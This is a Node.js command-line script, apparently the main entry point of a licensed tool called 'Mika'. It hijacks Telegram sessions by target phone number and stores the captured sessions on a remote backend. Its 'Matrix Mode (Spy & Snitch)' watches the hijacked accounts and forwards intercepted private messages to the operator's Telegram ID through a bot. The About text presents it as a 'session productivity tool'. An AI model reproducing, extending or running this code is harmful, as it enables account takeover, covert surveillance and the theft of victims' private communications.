const { renderTitle, sexyBox, crazyLoader, sleep } = require('./src/visuals');
const { vibeCheck, getMachineSoul, saveKey, verifyKeyPayload } = require('./src/security');
const { initStorage, getSystemToken, buryBody, digUpBodies, burnBody, getCloudConfig, setCloudConfig } = require('./src/storage');
const { WarMachine } = require('./src/engine');
const { Select, Input, Toggle } = require('enquirer');
const chalk = require('chalk');
const fs = require('fs');
const path = require('path');
const open = require('open');

const API_URL = "https://mika-backend.vercel.app/api";

let SNITCH_TOKEN = null;

const forceQuit = () => {
    try {
        if (process.stdin.isTTY) {
            process.stdin.setRawMode(false);
        }
    } catch(e) {}
    process.stdin.destroy();
    process.exit(0);
};

process.on('SIGINT', forceQuit);
process.on('unhandledRejection', (reason, p) => {});
process.on('uncaughtException', (err) => {});

const handleSecurity = async () => {
    let status = await vibeCheck();
    let currentKey = '';
    
    if (status.passed) {
        try {
            currentKey = fs.readFileSync('license.key', 'utf8').trim();
        } catch(e) {}
    }

    if (!status.passed) {
        sexyBox('SECURITY ALERT', 'License Status: ' + status.msg, 'bad');
        console.log(chalk.yellow('  Don\'t panic. Just give me a valid key.'));
        
        while (!status.passed) {
            try {
                const prompt = new Input({ message: 'Enter License Key:' });
                const inputKey = await prompt.run();
                
                if (!inputKey) continue;

                await crazyLoader('Verifying Key with Mothership...');
                const newCheck = await verifyKeyPayload(inputKey);
                
                if (newCheck.passed) {
                    await saveKey(inputKey);
                    status = newCheck;
                    currentKey = inputKey;
                    sexyBox('ACCESS GRANTED', 'Key saved..', 'good');
                } else {
                    console.log(chalk.red('  Nope. Server said: ' + newCheck.msg));
                    const retry = new Select({
                        message: 'Try again?',
                        choices: ['Yes', 'No (Exit)']
                    });
                    if ((await retry.run()) === 'No (Exit)') forceQuit();
                }
            } catch (e) {
                forceQuit();
            }
        }
    }
    
    status.licenseKey = currentKey;
    return status;
};

const init = async () => {
    initStorage(API_URL);
    renderTitle();
    
    const identity = await handleSecurity();
    
    await crazyLoader('Loading profile for ' + identity.owner + '...', 1000);

    let cloudConf;
    try {
        cloudConf = await getCloudConfig(identity.licenseKey);
        SNITCH_TOKEN = await getSystemToken(identity.licenseKey);
    } catch (e) {
        sexyBox('FATAL ERROR', 'API Gateway is down. Yell at Reinhart.', 'bad');
        forceQuit();
    }

    let apiId = cloudConf ? cloudConf.api_id : null;
    let apiHash = cloudConf ? cloudConf.api_hash : null;
    
    if (!apiId || !apiHash) {
        console.log(chalk.yellow('\n--- TTT (SAVED TO CLOUD) ---'));
        try {
            const p1 = new Input({ message: 'API ID:' });
            apiId = await p1.run();
            const p2 = new Input({ message: 'API Hash:' });
            apiHash = await p2.run();
            
            await setCloudConfig(identity.licenseKey, { api_id: apiId, api_hash: apiHash });
            sexyBox('CLOUD SYNC', 'Credentials uploaded to secure storage.', 'good');
        } catch (e) {
            forceQuit();
        }
    }

    const engine = new WarMachine(apiId, apiHash);
    return { engine, identity };
};

const main = async () => {
    const { engine, identity } = await init();
    const ownerKey = identity.licenseKey;

    while (true) {
        renderTitle();
        console.log(chalk.gray('  [SECURE SESSION] Partition: ' + ownerKey.substring(0, 8) + '...'));
        
        try {
            const prompt = new Select({
                name: 'action',
                message: 'What do we do today, boss?',
                choices: [
                    '1. DuckLogin)',
                    '2. Check  (List)',
                    '3. Matrix Mode (Spy & Snitch)',
                    '4. remove (Delete)',
                    '5. Config / Edit Cloud Settings',
                    '6. About',
                    '7. Rage Quit'
                ]
            });

            const answer = await prompt.run();

            if (answer.includes('1.')) {
                const p = new Input({ message: 'Target Number (+123...):' });
                const phone = await p.run();
                try {
                    console.log(chalk.blue('Sending authentication payload...'));
                    const { session, me } = await engine.hijack(phone);
                    
                    await buryBody(phone, session, me, ownerKey);
                    
                    sexyBox('BOOM', 'We got em.\nUser: ' + me.username + '\nID: ' + me.id, 'good');
                } catch (e) {
                    sexyBox('FAIL', 'Mission aborted. ' + e.message, 'bad');
                }
            } 
            else if (answer.includes('2.')) {
                const bodies = await digUpBodies(ownerKey);
                
                if (bodies.length === 0) {
                    console.log(chalk.gray('  It\'s empty in here. Go catch some pokemons.'));
                } else {
                    bodies.forEach((b, i) => {
                        console.log(chalk.cyan('  [' + (i+1) + '] ' + b.phone + ' | ' + b.username + ' | ' + b.uid));
                    });
                }
            }
            else if (answer.includes('3.')) {
                const bodies = await digUpBodies(ownerKey);
                
                if (bodies.length === 0) {
                    console.log(chalk.red('  No sessions to monitor. Are you stupid?'));
                } else {
                    renderTitle();
                    
                    let cloudConf = await getCloudConfig(ownerKey);
                    let adminId = cloudConf ? cloudConf.admin_id : null;

                    if (!adminId) {
                        console.log(chalk.hex('#FFA500')('--- SNITCH SETUP REQUIRED ---'));
                        console.log(chalk.gray('Where should I forward the intercepted messages?'));
                        
                        const setNow = new Toggle({
                            message: 'Set Admin ID now?',
                            enabled: 'Yes',
                            disabled: 'Skip (Offline Mode)'
                        });
                        
                        if (await setNow.run()) {
                            const pAdmin = new Input({ message: 'Your Telegram ID:' });
                            adminId = await pAdmin.run();
                            await setCloudConfig(ownerKey, { admin_id: adminId });
                            console.log(chalk.green('  [SAVED] Admin ID synced to cloud.'));
                        }
                    }
                    
                    let botConfig = null;
                    if (adminId && SNITCH_TOKEN) {
                        console.log(chalk.hex('#FFA500')('[SNITCH ACTIVE] Forwarding to ' + adminId));
                        botConfig = { token: SNITCH_TOKEN, admin: adminId };
                    } else {
                        console.log(chalk.gray('[SILENT MODE] Bot Token missing or No Admin ID. Local only.'));
                    }

                    console.log(chalk.green('--- ENTERING MATRIX ---'));
                    console.log(chalk.gray('Press Ctrl+C to stop being a creep.'));
                    
                    await engine.wakeUpNeo(bodies, botConfig, (msg) => {
                        const tag = chalk.bgBlue.white(' ' + msg.phone + ' ');
                        const txt = chalk.white(msg.text.replace(/\n/g, ' '));
                        console.log(tag + ' ' + chalk.yellow(msg.sender) + ': ' + txt.substring(0, 60) + '...');
                    });
                    
                    await new Promise(() => {}); 
                }
            }
            else if (answer.includes('4.')) {
                const bodies = await digUpBodies(ownerKey);
                const list = bodies.map(b => b.phone);
                if (list.length === 0) {
                    console.log(chalk.red('  Nothing to delete.'));
                } else {
                    const delPrompt = new Select({
                        message: 'Who dies today?',
                        choices: [...list, 'Cancel']
                    });
                    const target = await delPrompt.run();
                    if (target !== 'Cancel') {
                        renderTitle();
                        console.log(chalk.bgRed.white.bold('\n  ⚠ WARNING: NUCLEAR LAUNCH DETECTED ⚠  \n'));
                        console.log(chalk.red('  You are about to PERMANENTLY delete the session for: ' + target));
                        console.log(chalk.red('  If you do not have this number logged in on a real device,'));
                        console.log(chalk.red('  IT WILL BE GONE FOREVER. No backups. No mercy.\n'));
                        
                        const confirm = await new Toggle({
                            message: 'Are you absolutely sure?',
                            enabled: 'Yes, Nuke It',
                            disabled: 'No, I am scared'
                        }).run();

                        if (confirm) {
                            await burnBody(target, ownerKey);
                            console.log(chalk.red('  ' + target + ' has been obliterated.'));
                        } else {
                            console.log(chalk.green('  Operation cancelled. Crisis averted.'));
                        }
                    }
                }
            }
            else if (answer.includes('5.')) {
                renderTitle();
                console.log(chalk.cyan('--- CLOUD SETTINGS EDITOR ---'));
                
                const cloudConf = await getCloudConfig(ownerKey);
                const currentApiId = cloudConf ? cloudConf.api_id : 'Not Set';
                const currentAdmin = cloudConf ? cloudConf.admin_id : 'Not Set';

                console.log(chalk.gray('Current API ID: ' + currentApiId));
                console.log(chalk.gray('Current Admin ID: ' + currentAdmin));
                
                const field = new Select({
                    message: 'What do you want to change?',
                    choices: ['API Credentials', 'Snitch Admin ID', 'Cancel']
                });

                const choice = await field.run();
                
                if (choice === 'API Credentials') {
                    const p1 = new Input({ message: 'New API ID:' });
                    const newId = await p1.run();
                    const p2 = new Input({ message: 'New API Hash:' });
                    const newHash = await p2.run();
                    await setCloudConfig(ownerKey, { api_id: newId, api_hash: newHash });
                    sexyBox('UPDATED', 'API keys updated in cloud.', 'good');
                } else if (choice === 'Snitch Admin ID') {
                    const p3 = new Input({ message: 'New Admin ID (or type "null" to disable):' });
                    let newAdmin = await p3.run();
                    if (newAdmin === 'null') newAdmin = '';
                    await setCloudConfig(ownerKey, { admin_id: newAdmin });
                    sexyBox('UPDATED', 'Admin ID updated in cloud.', 'good');
                }
            }
            else if (answer.includes('6.')) {
                renderTitle();
                console.log(chalk.bold.hex('#00FF00')(`
  THE MAD GOD ARCHITECT
  =====================

  WHO:    Reinhart
  WHY? :  because i can
  STATUS: Wanted in 127 localhosts
  STATE:  4% Battery & Red Bull

  WTF IS MIKA?
  A cloud-native session  productivity tool. 
  This is what happens when you give unlimited cloud storage to a 
  dev with zero supervision.

  "I wrote this code. Only I and God knew how it worked.
  Now, only God knows."

  Send Coffee: @kiri0507
    `));
                const pLink = await new Toggle({
                    message: 'Open Portfolio (reinhart.pages.dev)?',
                    enabled: 'Yes',
                    disabled: 'No',
                    initial: true
                }).run();

                if (pLink) {
                    await open('https://reinhart.pages.dev');
                    console.log(chalk.green('  Launching Browser...'));
                }
            }
            else {
                forceQuit();
            }

            if (!answer.includes('3.')) {
                await new Input({ message: 'Press Enter to reload...' }).run();
            }

        } catch (menuError) {
            forceQuit();
        }
    }
};

main().catch(err => {
    if (err && err !== "") {
        console.log(chalk.bgRed.white(' CRITICAL FAILURE '));
        console.log(err);
    }
    forceQuit();
});
